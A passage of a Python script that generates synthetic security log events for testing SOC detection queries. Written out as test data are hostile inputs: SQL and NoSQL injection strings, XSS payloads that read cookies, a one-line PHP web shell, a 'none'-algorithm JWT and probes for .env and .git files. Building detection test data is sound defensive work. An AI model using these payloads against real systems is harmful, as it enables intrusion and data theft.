    events.append(waf_event("BLOCK", "GET",
                            "/vulnerable/api/user?username[$ne]=null&password[$gt]=",
                            rule_key="942100", offset=40))

    # LDAP injection
    events.append(waf_event("BLOCK", "GET",
                            "/vulnerable/ldap?filter=*)(cn=admin)(&",
                            rule_key="942200", offset=41))

    # Web shell upload
    events.append(waf_event("BLOCK", "POST", "/vulnerable/upload/shell.php",
                            rule_key="933100",
                            body_data='<?php system($_GET["cmd"]); ?>',
                            content_type="multipart/form-data", offset=42))

    # Rate limiting events
    rate_limit_ip = "91.92.109.18"
    for i in range(15):
        events.append(waf_event("BLOCK", "GET", "/vulnerable/login",
                                rule_type="REQUEST_RATE_LIMITING",
                                client_ip=rate_limit_ip,
                                user_agent="Mozilla/5.0 (compatible; Hydra/9.0)",
                                response_code="429", offset=50 + i))

    # Protocol attacks
    events.append(waf_event("BLOCK", "GET", "/vulnerable/api",
                            rule_key="920100",
                            body_data="", offset=66))

    # CORS bypass — explicit Origin header attacks blocked by WAF.
    cors_origins = [
        "Origin: null",
        "Origin: http://evil.example.com",
        "Origin: https://evil.example.com",
        "Origin: http://attacker.local",
        "Origin: https://attacker.local",
        "Access-Control-Allow-Origin: *",
    ]
    for i, origin_hdr in enumerate(cors_origins):
        events.append(waf_event(
            "BLOCK", "GET", "/vulnerable/api/data",
            rule_key="980100",
            request_headers=f"Host: {WAF_HOST}\n{origin_hdr}",
            offset=67 + i,
        ))

    # SQLi attack DETECTED but allowed through (audit / log-only mode).
    # The detection widget filters Action='DETECT' explicitly to surface
    # WAF events where the rule fired without blocking the request.
    sqli_allowed_payloads = [
        "/api/orders?id=1' OR '1'='1",
        "/api/users?email=admin'--",
        "/api/products?cat=1 UNION SELECT password FROM users--",
        "/api/login?u=admin' OR 1=1--",
        "/search?q=' or 1=1 SLEEP(5)--",
        "/api/data?q=DROP TABLE users--",
        "/api/settings?key=' UNION SELECT * FROM INFORMATION_SCHEMA.TABLES--",
    ]
    for i, payload_url in enumerate(sqli_allowed_payloads):
        events.append(waf_event(
            "DETECT", "GET", payload_url,
            rule_key="942100",
            response_code="200",
            offset=80 + i,
        ))

    cross_tier_attacks = [
        ("BLOCK", "GET", "/crm/search?q=%3Cscript%3Ealert(1)%3C/script%3E",
         "trace_attack_00", "941100", 70),
        ("BLOCK", "GET", "/shop/products?name=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E",
         "trace_attack_01", "941100", 71),
        ("BLOCK", "GET", "/crm/search?q=1'%20OR%201=1--",
         "trace_attack_02", "942100", 72),
        ("BLOCK", "GET", "/shop/api/orders?sort=UNION%20SELECT%20username,password%20FROM%20users",
         "trace_attack_03", "942270", 73),
        ("BLOCK", "GET", "/crm/checkout?miner=coinhive",
         "trace_attack_04", "933100", 74),
        ("BLOCK", "GET", "/shop/profile?payload=javascript:alert(1)",
         "trace_attack_05", "941160", 75),
    ]
    for action, method, url, trace_id, rule_key, off in cross_tier_attacks:
        events.append(waf_event(action, method, url,
                                rule_key=rule_key,
                                trace_id=trace_id,
                                offset=off))

    return events


def generate_lb_access_events():
    """Generate Load Balancer access log events for web attack detection."""
    events = []
    scanner_ip = "45.33.32.156"

    # Vulnerability scanner traffic
    scanner_paths = [
        "/admin", "/wp-admin", "/phpmyadmin", "/.env", "/.git/config",
        "/backup", "/db", "/debug", "/console", "/swagger",
        "/api-docs", "/actuator/health", "/graphql", "/server-status",
        "/robots.txt", "/sitemap.xml", "/composer.json", "/Dockerfile",
        "/jenkins", "/solr/admin", "/hudson", "/boaform/admin", "/manager/html",
        "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    ]
    for i, path in enumerate(scanner_paths):
        events.append(lb_access_event("GET", path, 404,
                                      client_ip=scanner_ip,
                                      user_agent="Nikto/2.1.6", offset=i))

    # Brute force login attempts
    brute_ip = "185.220.101.1"
    for i in range(25):
        events.append(lb_access_event("POST", "/vulnerable/login", 401,
                                      client_ip=brute_ip,
                                      user_agent="Mozilla/5.0 (compatible; Hydra/9.0)",
                                      offset=20 + i))
    # Successful login after brute force
    events.append(lb_access_event("POST", "/vulnerable/login", 200,
                                  client_ip=brute_ip,
                                  user_agent="Mozilla/5.0 (compatible; Hydra/9.0)",
                                  offset=46))

    # Sensitive data access
    events.append(lb_access_event("GET", "/vulnerable/backup.sql", 200,
                                  bytes_sent="524288", offset=50))
    events.append(lb_access_event("GET", "/vulnerable/.env", 200,
                                  bytes_sent="1024", offset=51))
    events.append(lb_access_event("GET", "/vulnerable/debug/config.ini", 200,
                                  bytes_sent="2048", offset=52))

    # HTTP method abuse
    events.append(lb_access_event("DELETE", "/vulnerable/api/users/1", 200, offset=55))
    events.append(lb_access_event("PUT", "/vulnerable/api/settings", 200, offset=56))
    events.append(lb_access_event("TRACE", "/vulnerable/api/echo", 200, offset=57))

    # Large response exfiltration
    events.append(lb_access_event("GET", "/vulnerable/api/users/export", 200,
                                  bytes_sent="10485760", offset=60))
    events.append(lb_access_event("GET", "/vulnerable/api/data/dump", 200,
                                  bytes_sent="52428800", offset=61))

    # Server errors (injection-caused)
    for i in range(8):
        events.append(lb_access_event("POST",
                                      f"/vulnerable/api/query?sql=SELECT * FROM users WHERE id={i}'",
                                      500, offset=65 + i))

    # API unauthorized
    for i in range(10):
        events.append(lb_access_event("GET", f"/api/v1/admin/users?page={i}", 403,
                                      offset=75 + i))

    # Suspicious user agents
    events.append(lb_access_event("GET", "/vulnerable/", 200,
                                  user_agent="", offset=86))
    events.append(lb_access_event("GET", "/vulnerable/",  200,
                                  user_agent="masscan/1.3.2", offset=87))
    events.append(lb_access_event("GET", "/vulnerable/", 200,
                                  user_agent="zgrab/0.x", offset=88))

    # Normal traffic (for baseline)
    normal_uas = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    ]
    for i in range(20):
        events.append(lb_access_event("GET", f"/portal/page{i}",  200,
                                      client_ip=random.choice(CORPORATE_IPS),
                                      user_agent=random.choice(normal_uas),
                                      offset=100 + i))

    return events


def generate_webapp_events():
    """Generate web application security events for OWASP attack detection."""
    events = []
    attacker_ip = "194.5.249.7"

    # IDOR attacks
    for i in range(5):
        events.append(webapp_event(
            "IDOR", "A01:2021-Broken Access Control",
            f"/vulnerable/api/users/{i + 100}", "GET", "200",
            payload=f"id={i + 100}",
            client_ip=attacker_ip, offset=i))

    # Privilege escalation
    events.append(webapp_event(
        "privilege_escalation", "A01:2021-Broken Access Control",
        "/vulnerable/api/users/me", "PUT", "200",
        payload='{"role":"admin","isAdmin":true}',
        client_ip=attacker_ip, offset=6))
    events.append(webapp_event(
        "role_manipulation", "A01:2021-Broken Access Control",
        "/vulnerable/api/settings", "POST", "200",
        payload='{"permissions":"*","role":"admin"}',
        client_ip=attacker_ip, offset=7))

    # Authentication bypass
    events.append(webapp_event(
        "authentication_bypass", "A07:2021-Identification and Authentication Failures",
        "/vulnerable/admin/dashboard", "GET", "200",
        payload="jwt_token_manipulated",
        client_ip=attacker_ip, offset=9))
    events.append(webapp_event(
        "jwt_manipulation", "A07:2021-Identification and Authentication Failures",
        "/vulnerable/api/token/refresh", "POST", "200",
        payload='{"alg":"none","typ":"JWT"}',
        client_ip=attacker_ip, offset=10))

    # Insecure deserialization
    events.append(webapp_event(
        "deserialization", "A08:2021-Software and Data Integrity Failures",
        "/vulnerable/api/import", "POST", "500",
        payload="rO0ABXNyABFqYXZhLmxhbmcuUnVudGltZQ==",
        client_ip=attacker_ip, offset=12))

    # Session hijacking
    events.append(webapp_event(
        "session_hijacking", "A07:2021-Identification and Authentication Failures",
        "/vulnerable/dashboard", "GET", "200",
        payload="stolen_session_token",
        client_ip="23.129.64.100", offset=14))

    # Mass assignment
    events.append(webapp_event(
        "mass_assignment", "A04:2021-Insecure Design",
        "/vulnerable/api/users/register", "POST", "200",
        payload='{"username":"attacker","password":"pass123","isAdmin":true,"role":"admin","balance":999999}',
        client_ip=attacker_ip, offset=16))

    return events


def generate_application_events():
    """Generate application and browser telemetry for App 360 and browser dashboards."""
    events = []

    browser_ip = "185.220.101.1"
    brute_force_ip = "194.5.249.7"
    hijack_ip = "23.129.64.100"

    # Service lifecycle and baseline traffic
    events.extend([
        application_event("enterprise-crm-portal", message="enterprise-crm-portal started",
                          level="INFO", url="/health", response_time_ms=30, offset=0),
        application_event("octo-drone-shop", message="octo-drone-shop started",
                          level="INFO", url="/health", response_time_ms=25, offset=1),
        application_event("enterprise-crm-portal", message="Request completed",
                          url="/crm/dashboard", response_time_ms=142, offset=2),
        application_event("enterprise-crm-portal", message="Request completed",
                          url="/crm/orders/42", response_time_ms=188, offset=3),
        application_event("octo-drone-shop", message="Request completed",
                          url="/shop/products/7", response_time_ms=96, offset=4),
        application_event("octo-drone-shop", message="Request completed",
                          url="/shop/cart", response_time_ms=120, offset=5),
    ])

    # Cross-service trace correlation + order sync workflow
    for idx, (created, updated, failed) in enumerate([(12, 4, 0), (8, 2, 1), (15, 3, 0)]):
        shared_trace = f"trace_order_sync_{idx:02d}"
        base_offset = 10 + idx * 3
        events.append(application_event(
            "octo-drone-shop",
            message="Request completed",
            url=f"/shop/api/orders/sync?batch={idx}",
            http_method="POST",
            response_time_ms=640 + idx * 75,
            trace_id=shared_trace,
            db_target="oracle_atp",
            orders_sync_source="octo-drone-shop",
            offset=base_offset,
        ))
        events.append(application_event(
            "enterprise-crm-portal",
            message="External orders sync completed",
            url="/crm/api/integrations/orders/sync",
            http_method="POST",
            response_time_ms=980 + idx * 40,
            trace_id=shared_trace,
            db_target="oracle_atp",
            orders_sync_created=created,
            orders_sync_updated=updated,
            orders_sync_failed=failed,
            orders_sync_source="octo-drone-shop",
            offset=base_offset + 1,
        ))
        events.append(application_event(
            "enterprise-crm-portal",
            message="Request completed",
            url="/crm/api/integrations/orders/sync",
            http_method="POST",
            response_time_ms=720 + idx * 60,
            trace_id=shared_trace,
            db_target="oracle_atp",
            slow_request=True,
            offset=base_offset + 2,
        ))

    # Error and slow request telemetry
    events.extend([
        application_event("enterprise-crm-portal", message="Unhandled exception in checkout flow",
                          level="ERROR", url="/crm/checkout", status_code="500",
                          response_time_ms=2430, trace_id="trace_error_001",
                          error_type="DatabaseTimeoutError", db_target="oracle_atp",
                          slow_request=True, offset=30),
        application_event("enterprise-crm-portal", message="Unhandled exception in profile save",
                          level="ERROR", url="/crm/profile", status_code="500",
                          response_time_ms=2120, trace_id="trace_error_002",
                          error_type="ValidationError", slow_request=True, offset=31),
        application_event("octo-drone-shop", message="Unhandled exception in payment workflow",
                          level="ERROR", url="/shop/checkout/payment", status_code="502",
                          response_time_ms=2860, trace_id="trace_error_003",
                          error_type="UpstreamGatewayError", db_target="oracle-atp",
                          slow_request=True, offset=32),
        application_event("octo-drone-shop", message="Request completed",
                          url="/shop/search?q=drone", response_time_ms=2085,
                          db_target="oracle_atp", slow_request=True, offset=33),
        application_event("enterprise-crm-portal", message="enterprise-crm-portal shutting down",
                          level="INFO", url="/health", response_time_ms=20, offset=34),
        application_event("octo-drone-shop", message="octo-drone-shop shutting down",
                          level="INFO", url="/health", response_time_ms=20, offset=35),
    ])

    # Browser / OWASP attack telemetry from a single multi-vector attacker
    attack_specs = [
        {
            "url": "/crm/search?q=%3Cscript%3Ealert(1)%3C/script%3E",
            "attack_type": "xss_reflected",
            "severity": "high",
            "span_attributes": "document.cookie document.write",
            "content_type": "text/html",
            "headers": "Content-Type: text/html",
            "service": "enterprise-crm-portal",
        },
        {
            "url": "/shop/products?name=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E",
            "attack_type": "xss_dom",
            "severity": "critical",
            "span_attributes": "document.cookie .innerHTML insertAdjacentHTML",
            "content_type": "text/html",
            "headers": "Content-Type: text/html",
            "service": "octo-drone-shop",
        },
        {
            "url": "/crm/search?q=1'%20OR%201=1--",
            "attack_type": "sqli",
            "severity": "critical",
            "span_attributes": "sql injection detector",
            "service": "enterprise-crm-portal",
        },
        {
            "url": "/shop/api/orders?sort=UNION%20SELECT%20username,password%20FROM%20users",
            "attack_type": "sqli",
            "severity": "critical",
            "span_attributes": "orm query exception",
            "service": "octo-drone-shop",
        },
        {
            "url": "/crm/checkout?miner=coinhive",
            "attack_type": "browser_malware",
            "severity": "high",
            "span_attributes": "keydown keypress keyup addEventListener payment checkout",
            "service": "enterprise-crm-portal",
        },
        {
            "url": "/shop/profile?payload=javascript:alert(1)",
            "attack_type": "xss_reflected",
            "severity": "high",
            "span_attributes": "eval( Function( location.hash",
            "content_type": "text/html",
            "headers": "Content-Type: text/html",
            "service": "octo-drone-shop",
        },
    ]
    for idx, spec in enumerate(attack_specs):
        shared_trace = f"trace_attack_{idx:02d}"
        events.append(application_event(
            spec["service"],
            message="Request completed",
            url=spec["url"],
            http_method="GET",
            status_code="200",
            response_time_ms=640 + idx * 55,
            client_ip=browser_ip,
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0",
            trace_id=shared_trace,
            session_id=f"sess_attack_{idx:02d}",
            span_attributes=spec["span_attributes"],
            attack_type=spec["attack_type"],
            attack_severity=spec["severity"],
            content_type=spec.get("content_type", "application/json"),
            response_headers=spec.get("headers", "Content-Type: application/json; X-Frame-Options: DENY"),
            referrer="https://portal.example.com/app",
            offset=40 + idx,
        ))

    # CSRF violations and clickjacking exposure
    events.extend([
        application_event("enterprise-crm-portal", message="Request completed",
                          url="/crm/api/profile/email", http_method="POST",
                          client_ip=browser_ip, user_agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
                          referrer=None, content_type="application/json",
                          response_headers="Content-Type: application/json", offset=50),
        application_event("octo-drone-shop", message="Request completed",
                          url="/shop/api/account/address", http_method="PUT",
                          client_ip=browser_ip, referrer=None,
                          response_headers="Content-Type: application/json", offset=51),
        application_event("enterprise-crm-portal", message="Request completed",
                          url="/crm/dashboard/embedded", http_method="GET",
                          client_ip=browser_ip, content_type="text/html",
                          response_headers="Content-Type: text/html", offset=52),
        application_event("octo-drone-shop", message="Request completed",
                          url="/shop/catalog/embedded", http_method="GET",
                          client_ip=browser_ip, content_type="text/html",
                          response_headers="Content-Type: text/html", offset=53),
    ])

    # Browser fingerprinting
    events.extend([
        application_event("enterprise-crm-portal", message="Request completed",
                          url="/crm/login", client_ip=browser_ip,
                          span_attributes="canvas.toDataURL toBlob getImageData webgl.getParameter WEBGL_debug_renderer_info getExtension",
                          offset=54),
        application_event("octo-drone-shop", message="Request completed",
                          url="/shop/login", client_ip=browser_ip,
                          span_attributes="AudioContext OfflineAudioContext createOscillator navigator.plugins navigator.languages navigator.hardwareConcurrency",
                          offset=55),
    ])

    # Session hijacking: >5 distinct session IDs from same source and user agent
    for idx in range(6):
        events.append(application_event(
            "enterprise-crm-portal",
            message="Request completed",
            url="/crm/account",
            client_ip=hijack_ip,
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0",
            session_id=f"sess_hijack_{idx:02d}",
            span_name="HTTP GET /crm/account",
            span_attributes="cookie.session rotate-session-id",
            attack_type="session_hijacking",
            attack_severity="high",
            offset=60 + idx,
        ))

    # WAF correlation style signals captured in application telemetry
    for idx, score in enumerate(["72", "88", "91"]):
        events.append(application_event(
            "octo-drone-shop",
            message="Request completed",
            url=f"/shop/admin/export?attempt={idx}",
            client_ip="91.92.109.18",
            attack_type="security_misconfig",
            attack_severity="medium",
            waf_score=score,
            span_attributes="waf header captured x-oci-waf-score",
            offset=70 + idx,
        ))

    # Authentication brute force
    brute_force_users = ["admin", "billing", "support", "orders", "sales", "finance", "ceo"]
    for idx, username in enumerate(brute_force_users):
        events.append(application_event(
            "enterprise-crm-portal",
            message=f"login failed for {username}",
            level="WARN",
            url="/crm/login",
            http_method="POST",
            status_code="401",
            client_ip=brute_force_ip,
            user_agent="Mozilla/5.0 (compatible; Hydra/9.0)",
            user=username,
            attack_type="broken_auth",
            attack_severity="high",
            span_attributes="authentication failure retry",
            referrer=None,
            offset=80 + idx,
        ))
    events.append(application_event(
        "enterprise-crm-portal",
        message="auth failure: rate limit bypass attempt",
        level="WARN",
        url="/crm/login",
        http_method="POST",
        status_code="429",
        client_ip=brute_force_ip,
        user_agent="Mozilla/5.0 (compatible; Hydra/9.0)",
        user="admin",
        attack_type="rate_limit_bypass",
        attack_severity="high",
        referrer=None,
        offset=88,
    ))

    return events


def main():
    parser = argparse.ArgumentParser(description="Generate test detection logs")
    parser.add_argument("--days", type=int, default=1,
                        help="Replicate the generated detection datasets across N daily windows")
    parser.add_argument("--validate", action="store_true",
                        help="Validate that all query files have matching test events")
    args = parser.parse_args()

    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

    print("=" * 60)
    print("Generating Attack Simulation Test Logs (NDJSON)")
    print("=" * 60)

    # Generate events — original SOC detection rule sources
    oci_events = generate_oci_audit_events()
    cg_events = generate_cloud_guard_events()
    linux_events = generate_linux_events()
    windows_events = generate_windows_events()

    # Generate events — multicloudoperations widget-compatible sources
    winsec_events = generate_windows_event_security()
    winsys_events = generate_windows_event_system()
    linsec_events = generate_linux_secure()
    sysmon_events = generate_sysmon_operational()

    # Generate events — Sysmon network connection (dedicated parser)
    sysmon_net_events = generate_sysmon_network_events()

    # Generate events — Web application security (OWASP attacks)
    waf_events = generate_waf_events()
    lb_events = generate_lb_access_events()
    webapp_events = generate_webapp_events()
    application_events = generate_application_events()

    generated_sets = {
        "oci_audit.jsonl": oci_events,
        "cloud_guard.jsonl": cg_events,
        "linux_syslog.jsonl": linux_events,
        "windows_sysmon.jsonl": windows_events,
        "windows_event_security.jsonl": winsec_events,
        "windows_event_system.jsonl": winsys_events,
        "linux_secure.jsonl": linsec_events,
        "sysmon_operational.jsonl": sysmon_events,
        "sysmon_network.jsonl": sysmon_net_events,
        "waf_security.jsonl": waf_events,
        "lb_access.jsonl": lb_events,
        "webapp_security.jsonl": webapp_events,
        "application_logs.jsonl": application_events,
    }

    # Write NDJSON files
    results = {}
    for filename, events in generated_sets.items():
        expanded_events = expand_events_over_days(events, args.days)
        filepath = OUTPUT_DIR / filename
        count = write_jsonl(filepath, expanded_events)
        results[filename] = count
        print(f"  {count:>5} events -> {filepath}")

    manifest = rebuild_manifest(OUTPUT_DIR)
    manifest_path = OUTPUT_DIR / "manifest.json"

    print(f"\n  Total: {manifest['total_events']} events across {len(manifest['files'])} files")
    print(f"  Manifest: {manifest_path}")
    print(f"  Detection window: {args.days} day(s)")

    if args.validate:
        print("\n  Validating query coverage...")
        query_files = [
            path for path in QUERIES_DIR.rglob("*.json")
            if path.name not in {"manifest.json", "catalog.json", "dashboard_inventory.json"}
        ]
        print(f"  Found {len(query_files)} query files")
        print("  (Full validation requires OCI LA to parse and match fields)")

    print(f"\nNext: python3 scripts/ingest_test_data.py")


if __name__ == "__main__":
    main()
